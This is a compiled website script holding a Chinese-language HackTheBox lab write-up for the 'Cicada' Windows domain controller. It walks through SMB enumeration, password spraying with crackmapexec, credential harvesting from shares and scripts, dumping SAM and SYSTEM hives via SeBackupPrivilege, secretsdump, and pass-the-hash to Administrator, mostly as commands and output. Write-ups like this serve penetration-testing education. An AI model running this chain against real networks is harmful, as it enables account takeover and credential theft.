"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2471],{7590:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>t,default:()=>p,frontMatter:()=>c,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"HackTheBox/Machines/Cicada","title":"Cicada","description":"port scan","source":"@site/docs/HackTheBox/Machines/Cicada.md","sourceDirName":"HackTheBox/Machines","slug":"/HackTheBox/Machines/Cicada","permalink":"/docs/HackTheBox/Machines/Cicada","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackTheBox/Machines/Cicada.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBoxSidebar","previous":{"title":"Machines","permalink":"/docs/category/machines-1"},"next":{"title":"GreenHorn","permalink":"/docs/HackTheBox/Machines/GreenHorn"}}');var a=r(4848),i=r(8453);const c={},t=void 0,o={},d=[{value:"port scan",id:"port-scan",level:2},{value:"smb",id:"smb",level:2},{value:"rid \u679a\u4e3e",id:"rid-\u679a\u4e3e",level:2},{value:"enum4linux-ng \u679a\u4e3e",id:"enum4linux-ng-\u679a\u4e3e",level:2},{value:"evil-winrm \u767b\u5f55",id:"evil-winrm-\u767b\u5f55",level:2},{value:"impacket-secretsdump",id:"impacket-secretsdump",level:2}];function l(e){const n={code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Dec  1 23:00:42 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port -Pn 10.10.11.35\r\nNmap scan report for 10.10.11.35\r\nHost is up (0.12s latency).\r\nNot shown: 65523 filtered tcp ports (no-response)\r\nPORT      STATE SERVICE\r\n53/tcp    open  domain\r\n88/tcp    open  kerberos-sec\r\n135/tcp   open  msrpc\r\n139/tcp   open  netbios-ssn\r\n389/tcp   open  ldap\r\n445/tcp   open  microsoft-ds\r\n464/tcp   open  kpasswd5\r\n593/tcp   open  http-rpc-epmap\r\n636/tcp   open  ldapssl\r\n3268/tcp  open  globalcatLDAP\r\n3269/tcp  open  globalcatLDAPssl\r\n55863/tcp open  unknown\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Dec  1 23:02:52 2024 as: nmap -sT -sV -sC -O -p53,88,135,139,389,445,464,593,636,3268,3269,55863 -oN nmap_results/detil 10.10.11.35\r\nNmap scan report for 10.10.11.35\r\nHost is up (0.12s latency).\r\n\r\nPORT      STATE SERVICE       VERSION\r\n53/tcp    open  domain        Simple DNS Plus\r\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 10:49:09Z)\r\n135/tcp   open  msrpc         Microsoft Windows RPC\r\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\r\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\r\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb\r\n| Not valid before: 2024-08-22T20:24:16\r\n|_Not valid after:  2025-08-22T20:24:16\r\n445/tcp   open  microsoft-ds?\r\n464/tcp   open  kpasswd5?\r\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\r\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\r\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\r\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb\r\n| Not valid before: 2024-08-22T20:24:16\r\n|_Not valid after:  2025-08-22T20:24:16\r\n|_ssl-date: TLS randomness does not represent time\r\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\r\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb\r\n| Not valid before: 2024-08-22T20:24:16\r\n|_Not valid after:  2025-08-22T20:24:16\r\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\r\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\r\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb\r\n| Not valid before: 2024-08-22T20:24:16\r\n|_Not valid after:  2025-08-22T20:24:16\r\n|_ssl-date: TLS randomness does not represent time\r\n55863/tcp open  msrpc         Microsoft Windows RPC\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\r\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\r\n\r\nHost script results:\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled and required\r\n|_clock-skew: 6h46m10s\r\n| smb2-time: \r\n|   date: 2024-12-02T10:50:07\r\n|_  start_date: N/A\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"cicada.htb"})}),"\n",(0,a.jsx)(n.h2,{id:"smb",children:"smb"}),"\n",(0,a.jsxs)(n.p,{children:["\u5f00\u653e445\u7aef\u53e3\uff0c",(0,a.jsx)(n.code,{children:"smbclient"}),"\u8fde\u63a5"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"smbclient -L 10.10.11.35\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202182931957.png",alt:"image-20241202182931957"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b",(0,a.jsx)(n.code,{children:"HR"}),"\u76ee\u5f55"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"smbclient -N //10.10.11.35/HR\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:'smb: \\> ls\r\n  .                                   D        0  Thu Mar 14 08:29:09 2024\r\n  ..                                  D        0  Thu Mar 14 08:21:29 2024\r\n  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024\r\nsmb: \\> get "Notice from HR.txt"\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"Dear new hire!\r\n\r\nWelcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.\r\n\r\nYour default password is: Cicada$M6Corpb*@Lp#nZp!8\r\n\r\nTo change your password\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"Cicada$M6Corpb*@Lp#nZp!8"}),"\u62ff\u5230\u4e00\u4e2a\u9ed8\u8ba4\u5bc6\u7801"]}),"\n",(0,a.jsx)(n.h2,{id:"rid-\u679a\u4e3e",children:"rid \u679a\u4e3e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(kali\u327fkali)-[~/HackTheBox/Cicada]\r\n\u2514\u2500$ sudo crackmapexec smb 10.10.11.35 -u "guest" -p "" --rid-brute\r\nSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\r\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\guest: \r\nSMB         10.10.11.35     445    CICADA-DC        [+] Brute forcing RIDs\r\nSMB         10.10.11.35     445    CICADA-DC        1000: CICADA\\CICADA-DC$ (SidTypeUser)\r\nSMB         10.10.11.35     445    CICADA-DC        1101: CICADA\\DnsAdmins (SidTypeAlias)\r\nSMB         10.10.11.35     445    CICADA-DC        1102: CICADA\\DnsUpdateProxy (SidTypeGroup)\r\nSMB         10.10.11.35     445    CICADA-DC        1103: CICADA\\Groups (SidTypeGroup)\r\nSMB         10.10.11.35     445    CICADA-DC        1104: CICADA\\john.smoulder (SidTypeUser)\r\nSMB         10.10.11.35     445    CICADA-DC        1105: CICADA\\sarah.dantelia (SidTypeUser)\r\nSMB         10.10.11.35     445    CICADA-DC        1106: CICADA\\michael.wrightson (SidTypeUser)\r\nSMB         10.10.11.35     445    CICADA-DC        1108: CICADA\\david.orelious (SidTypeUser)\r\nSMB         10.10.11.35     445    CICADA-DC        1109: CICADA\\Dev Support (SidTypeGroup)\r\nSMB         10.10.11.35     445    CICADA-DC        1601: CICADA\\emily.oscars (SidTypeUser)\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"john.smoulder\r\nsarah.dantelia\r\nmichael.wrightson\r\ndavid.orelious\r\nemily.oscars\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"crackmapexec"}),"\u5de5\u5177\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"\u250c\u2500\u2500(kali\u327fkali)-[~/HackTheBox/Cicada]\r\n\u2514\u2500$ sudo crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"SMB   10.10.11.35  445  CICADA-DC [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202184318635.png",alt:"image-20241202184318635"})}),"\n",(0,a.jsx)(n.h2,{id:"enum4linux-ng-\u679a\u4e3e",children:"enum4linux-ng \u679a\u4e3e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"enum4linux-ng -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202190048097.png",alt:"image-20241202190048097"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u7528\u6237\u63cf\u8ff0\u5b57\u6bb5\u4e2d\u627e\u5230\u4e86David\u7684\u51ed\u8bc1\uff1a",(0,a.jsx)(n.code,{children:"aRt$Lp#7t*VQ!3"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u679a\u4e3e",(0,a.jsx)(n.code,{children:"david"})," \u7684\u5171\u4eab\u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"sudo crackmapexec smb 10.10.11.35 -d cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b",(0,a.jsx)(n.code,{children:"DEV"}),"\u76ee\u5f55"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"smbclient //10.10.11.35/DEV -U david.orelious\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u62ff\u5230",(0,a.jsx)(n.code,{children:"Backup_script.ps1"}),"\u7684powershell\u811a\u672c"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:'$sourceDirectory = "C:\\smb"\r\n$destinationDirectory = "D:\\Backup"\r\n\r\n$username = "emily.oscars"\r\n$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force\r\n$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\r\n$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"\r\n$backupFileName = "smb_backup_$dateStamp.zip"\r\n$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\r\nCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\r\nWrite-Host "Backup completed successfully. Backup file saved to: $backupFilePath"\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"emily.oscars:Q!3@Lp#M6b*7t*Vt"})}),"\n",(0,a.jsx)(n.p,{children:"\u62ff\u5230\u4e00\u5bf9\u51ed\u636e"}),"\n",(0,a.jsx)(n.h2,{id:"evil-winrm-\u767b\u5f55",children:"evil-winrm \u767b\u5f55"}),"\n",(0,a.jsx)(n.p,{children:"evil-winrm \u767b\u5f55 emily"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Emily \u7528\u6237\u5177\u6709",(0,a.jsx)(n.code,{children:"SeBackupPrivileges"}),"\u6743\u9650"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202191632950.png",alt:"image-20241202191632950"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"\u6b64\u6743\u9650\u5141\u8bb8\u7528\u6237\u8bfb\u53d6\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u6211\u4eec\u5c06\u5229\u7528\u8fd9\u4e00\u70b9\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u4ece Windows \u590d\u5236SAM\u548cSYSTEM\u6587\u4ef6\uff0c\u4f7f\u7528\u547d\u4ee4reg save hklm\\sam\u548creg save hklm\\system\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"reg save hklm\\sam C:\\temp\\sam\r\nreg save hklm\\system C:\\temp\\system\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202191911174.png",alt:"image-20241202191911174"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"*Evil-WinRM* PS C:\\temp> download sam ./sam\r\n                                        \r\nInfo: Downloading C:\\temp\\sam to ./sam\r\n                                        \r\nInfo: Download successful!\r\n*Evil-WinRM* PS C:\\temp> download system ./system\r\n                                        \r\nInfo: Downloading C:\\temp\\system to ./system\r\n                                        \r\nInfo: Download successful!\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4e0b\u8f7d\u5230\u672c\u673a"}),"\n",(0,a.jsx)(n.h2,{id:"impacket-secretsdump",children:"impacket-secretsdump"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"impacket-secretsdump -sam sam -system system local\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"Impacket v0.12.0.dev1 - Copyright 2023 Fortra\r\n\r\n[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620\r\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\r\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\r\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\n[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.\r\n[*] Cleaning up..\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"evil-winrm -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341' -i 10.10.11.35\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u62ff\u5230administrator\u6743\u9650"})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>t});var s=r(6540);const a={},i=s.createContext(a);function c(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);